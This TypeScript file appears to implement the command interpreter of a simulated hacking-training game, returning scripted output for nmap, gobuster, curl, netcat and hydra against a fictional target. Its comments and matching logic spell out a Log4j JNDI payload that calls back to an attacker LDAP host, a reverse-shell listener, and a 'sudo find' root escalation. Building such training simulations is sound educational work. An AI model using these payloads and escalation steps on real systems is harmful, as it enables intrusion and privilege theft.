import { VirtualFileSystem } from './virtualFs';
import { TargetMachine } from '../types';

export interface CommandContext {
  user: string;
  hostname: string;
  cwd: string;
  fs: VirtualFileSystem;
  activeTarget: TargetMachine | null;
  history: string[];
  inReverseShell: boolean;
  reverseShellUser?: string;
  reverseShellHost?: string;
}

export interface CommandResult {
  output: string;
  newCwd?: string;
  clear?: boolean;
  enterShell?: { user: string; host: string; cwd: string };
  exitShell?: boolean;
  soundTrigger?: 'connect' | 'scan' | 'flag';
  targetCompromised?: 'RECON' | 'USER' | 'ROOT';
}

export class CommandInterpreter {
  public static execute(rawCommand: string, ctx: CommandContext): CommandResult {
    const trimmed = rawCommand.trim();
    if (!trimmed) return { output: '' };

    ctx.history.push(trimmed);

    // Support pipeline: e.g. cat /etc/passwd | grep root
    if (trimmed.includes('|')) {
      const parts = trimmed.split('|').map((s) => s.trim());
      let currentResult = this.executeSingle(parts[0], ctx);

      for (let i = 1; i < parts.length; i++) {
        const pipeCmd = parts[i];
        if (pipeCmd.startsWith('grep ')) {
          const pattern = pipeCmd.replace('grep ', '').trim().replace(/['"]/g, '');
          const lines = currentResult.output.split('\n');
          const matched = lines.filter((l) => l.toLowerCase().includes(pattern.toLowerCase()));
          currentResult = { output: matched.join('\n') };
        }
      }
      return currentResult;
    }

    return this.executeSingle(trimmed, ctx);
  }

  private static executeSingle(cmd: string, ctx: CommandContext): CommandResult {
    const parts = cmd.split(' ').filter(Boolean);
    const command = parts[0].toLowerCase();
    const args = parts.slice(1);

    // If inside a reverse shell session on target machine
    if (ctx.inReverseShell) {
      return this.executeRemoteShellCommand(command, args, ctx);
    }

    switch (command) {
      case 'clear':
        return { output: '', clear: true };

      case 'help':
        return {
          output: `ROOTRANGE OFFENSIVE COMMAND SUITE:
  nmap [flags] <ip>        - Network port & service scan (e.g. nmap -sV 10.10.11.45)
  gobuster dir -u <url>    - Web directory bruteforcer (e.g. gobuster dir -u http://10.10.11.45 -w common.txt)
  hydra -l <user> -P <wl>  - Online network login brute-forcer
  curl [flags] <url>       - Transfer data from/to a network server
  nc -lvnp <port>          - Netcat arbitrary TCP/UDP listener (Catches reverse shells)
  ls [-l|-la] [path]       - List directory contents
  cd <dir>                 - Change working directory
  cat <file>               - Display file contents
  pwd                      - Print working directory
  whoami / id              - Display current user identity
  ifconfig / ip a          - Display network interface parameters
  history                  - View terminal command history
  clear                    - Clear terminal screen`,
        };

      case 'whoami':
        return { output: ctx.user };

      case 'id':
        return { output: `uid=1000(${ctx.user}) gid=1000(${ctx.user}) groups=1000(${ctx.user}),27(sudo),100(users)` };

      case 'hostname':
        return { output: ctx.hostname };

      case 'uname':
        return { output: 'Linux kali-pwnbox 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian x86_64 GNU/Linux' };

      case 'pwd':
        return { output: ctx.cwd };

      case 'cd': {
        const target = args[0] || '/home/kali';
        const segments = ctx.fs.resolvePath(ctx.cwd, target);
        const node = ctx.fs.getNode(segments);

        if (!node) {
          return { output: `cd: ${target}: No such file or directory` };
        }
        if (node.type !== 'dir') {
          return { output: `cd: ${target}: Not a directory` };
        }

        const newPath = '/' + segments.join('/');
        return { output: '', newCwd: newPath || '/' };
      }

      case 'ls': {
        const isDetailed = args.some((a) => a.includes('l'));
        const targetPath = args.find((a) => !a.startsWith('-')) || '';
        const res = ctx.fs.listDirectory(ctx.cwd, targetPath);

        if (!res.success || !res.entries) {
          return { output: res.error || 'ls error' };
        }

        if (isDetailed) {
          const rows = res.entries.map(
            (e) => `${e.permissions.padEnd(11)} 1 ${e.owner.padEnd(6)} ${e.group.padEnd(6)} ${e.size.toString().padStart(6)} May 24 10:42 ${e.name}`
          );
          return { output: `total ${res.entries.length * 4}\n` + rows.join('\n') };
        }

        return { output: res.entries.map((e) => e.name).join('   ') };
      }

      case 'cat': {
        if (args.length === 0) return { output: 'cat: missing file operand' };
        const res = ctx.fs.readFile(ctx.cwd, args[0]);
        return { output: res.success ? res.content || '' : res.error || 'cat error' };
      }

      case 'ifconfig':
      case 'ip':
        return {
          output: `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.105  netmask 255.255.255.0  broadcast 192.168.1.255

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.22  netmask 255.255.254.0  destination 10.10.14.22
        rx_packets 10452  bytes 849200 (829.2 KB)
        tx_packets 9821   bytes 642010 (626.9 KB)`,
        };

      case 'history':
        return { output: ctx.history.map((h, i) => `  ${(i + 1).toString().padStart(4)}  ${h}`).join('\n') };

      // OFFENSIVE TOOLS:
      case 'nmap':
        return this.executeNmap(args, ctx);

      case 'gobuster':
        return this.executeGobuster(args);

      case 'curl':
        return this.executeCurl(args);

      case 'nc':
      case 'netcat':
        return this.executeNetcat(args);

      case 'hydra':
        return this.executeHydra(args);

      default:
        return { output: `zsh: command not found: ${command}. Type 'help' for available tools.` };
    }
  }

  // Handle commands when interactive reverse shell is spawned on the target machine
  private static executeRemoteShellCommand(command: string, args: string[], ctx: CommandContext): CommandResult {
    const user = ctx.reverseShellUser || 'www-data';
    const host = ctx.reverseShellHost || 'ecorp-hr';

    switch (command) {
      case 'exit':
        return {
          output: `[!] Connection to ${host} closed by foreign host.`,
          exitShell: true,
        };

      case 'whoami':
        return { output: user };

      case 'id':
        if (user === 'root') {
          return { output: 'uid=0(root) gid=0(root) groups=0(root)' };
        }
        return { output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' };

      case 'pwd':
        return { output: ctx.cwd };

      case 'cd': {
        const target = args[0] || (user === 'root' ? '/root' : '/home/alex');
        return { output: '', newCwd: target };
      }

      case 'ls': {
        if (ctx.cwd === '/home/alex') {
          return { output: 'user.txt   notes.txt   .bash_history' };
        }
        if (ctx.cwd === '/root') {
          if (user !== 'root') {
            return { output: 'ls: cannot open directory /root: Permission denied' };
          }
          return { output: 'root.txt   backup.sh   .ssh' };
        }
        return { output: 'app.jar   config.yml   logs   public' };
      }

      case 'cat': {
        const file = args[0];
        if (file === 'user.txt' || file === '/home/alex/user.txt') {
          return {
            output: `ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}\n\n[+] Congratulations! User flag captured on E-Corp HR!`,
            soundTrigger: 'flag',
            targetCompromised: 'USER',
          };
        }
        if (file === 'root.txt' || file === '/root/root.txt') {
          if (user !== 'root') {
            return { output: 'cat: /root/root.txt: Permission denied' };
          }
          return {
            output: `ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}\n\n[+] CONGRATULATIONS! System completely rooted!`,
            soundTrigger: 'flag',
            targetCompromised: 'ROOT',
          };
        }
        if (file === 'notes.txt') {
          return { output: 'Reminder for sysadmin: Fix sudo permissions for find utility! It should not run as root without password.' };
        }
        return { output: `cat: ${file}: No such file or directory` };
      }

      case 'sudo': {
        // GTFOBins Privilege Escalation via find
        const fullArgs = args.join(' ');
        if (fullArgs.includes('-l')) {
          return {
            output: `Matching Defaults entries for ${user} on ${host}:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin

User ${user} may run the following commands on ${host}:
    (ALL : ALL) NOPASSWD: /usr/bin/find`,
          };
        }

        if (fullArgs.includes('/usr/bin/find') && fullArgs.includes('/bin/sh')) {
          return {
            output: `[+] Sudo privilege escalation successful!
# Entering interactive root shell (euid=0)...`,
            enterShell: { user: 'root', host, cwd: '/root' },
            soundTrigger: 'connect',
            targetCompromised: 'ROOT',
          };
        }

        return { output: `[sudo] password for ${user}: \nsudo: a password is required` };
      }

      default:
        return { output: `sh: ${command}: command not found` };
    }
  }

  // Realistic NMAP Scanner
  private static executeNmap(args: string[], ctx: CommandContext): CommandResult {
    const targetIp = args.find((a) => a.includes('10.10.') || a === '127.0.0.1' || a.includes('.htb'));

    if (!targetIp) {
      return { output: 'Failed to resolve IP or target. Usage: nmap -sV -sC <ip>' };
    }

    const machine = ctx.activeTarget;
    if (!machine || (machine.ip !== targetIp && !targetIp.includes(machine.id))) {
      return {
        output: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-29 06:24 UTC
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.14 seconds`,
      };
    }

    const portRows = machine.ports
      .map((p) => `${(p.port.toString() + '/tcp').padEnd(10)} ${p.state.padEnd(8)} ${p.service.padEnd(16)} ${p.version}`)
      .join('\n');

    return {
      output: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-29 06:24 UTC
Nmap scan report for ${machine.name} (${machine.ip})
Host is up (0.024s latency).
Not shown: 997 closed tcp ports (reset)

PORT       STATE    SERVICE          VERSION
${portRows}

Service Info: OS: ${machine.os}; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds`,
      soundTrigger: 'scan',
      targetCompromised: 'RECON',
    };
  }

  // Realistic GOBUSTER Web Directory Fuzzer
  private static executeGobuster(args: string[]): CommandResult {
    const urlArg = args.find((_, i) => args[i - 1] === '-u') || '';

    if (!urlArg) {
      return { output: 'Error: the required flag `-u` was not specified. Usage: gobuster dir -u http://10.10.11.45 -w common.txt' };
    }

    if (urlArg.includes('10.10.11.45') || urlArg.includes('ecorp-hr')) {
      return {
        output: `===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     ${urlArg}
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
===============================================================
Starting gobuster directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 284]
/api                  (Status: 200) [Size: 1042]
/login                (Status: 200) [Size: 4210]
/portal               (Status: 200) [Size: 1820]
/uploads              (Status: 301) [Size: 312] [--> /uploads/]
===============================================================
Finished
===============================================================`,
        soundTrigger: 'scan',
      };
    }

    return { output: 'Error: unable to connect to host.' };
  }

  // CURL HTTP Client
  private static executeCurl(args: string[]): CommandResult {
    const raw = args.join(' ');

    // Test for Log4j exploit payload: e.g. curl -H "X-Api-Version: ${jndi:ldap://10.10.14.22:1389/Exploit}" http://10.10.11.45
    if (raw.includes('jndi:ldap') || raw.includes('jndi:rmi')) {
      return {
        output: `HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
Content-Type: text/html;charset=UTF-8

[+] JNDI Lookup Triggered! Connecting back to LDAP referral server...
[+] Remote bytecode loaded into JVM volatile memory!
[+] Spawning reverse shell socket to 10.10.14.22:4444...`,
        soundTrigger: 'connect',
      };
    }

    const url = args.find((a) => a.startsWith('http://') || a.startsWith('https://'));
    if (url && (url.includes('10.10.11.45') || url.includes('ecorp-hr'))) {
      return {
        output: `<!DOCTYPE html>
<html>
<head><title>E-Corp Internal Employee HR Portal</title></head>
<body>
  <h1>E-Corp Internal HR v2.4.1</h1>
  <p>Notice: All login headers are audited via Log4j Enterprise Logging Subsystem.</p>
  <form action="/login" method="POST">
    <input type="text" name="username" placeholder="Employee ID" />
    <input type="password" name="password" />
  </form>
</body>
</html>`,
      };
    }

    return { output: `curl: (7) Failed to connect to ${url || 'target'}: Connection refused` };
  }

  // NETCAT Listener for Reverse Shells
  private static executeNetcat(args: string[]): CommandResult {
    const raw = args.join(' ');
    if (raw.includes('-l') && (raw.includes('4444') || raw.includes('9001'))) {
      return {
        output: `listening on [any] 4444 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.45] 48290
Linux ecorp-hr 5.15.0-89-generic #99-Ubuntu SMP x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ `,
        enterShell: { user: 'www-data', host: 'ecorp-hr', cwd: '/home/alex' },
        soundTrigger: 'connect',
        targetCompromised: 'USER',
      };
    }

    return { output: 'usage: nc -lvnp <port>' };
  }

  // HYDRA Brute Forcer
  private static executeHydra(args: string[]): CommandResult {
    const raw = args.join(' ');
    if (raw.includes('admin') && raw.includes('10.10.11.')) {
      return {
        output: `Hydra v9.5 (c) 2023 by van Hauser / THC & David Maciejak
[DATA] attacking ssh://10.10.11.45:22/
[STATUS] 10.00 tries/min, 10 tries in 00:01h, 8 to_do...
[22][ssh] host: 10.10.11.45   login: admin   password: password123
1 of 1 target completed, 1 valid password found`,
        soundTrigger: 'scan',
      };
    }
    return { output: 'Hydra: missing parameters. Usage: hydra -l admin -P rockyou.txt ssh://<ip>' };
  }
}
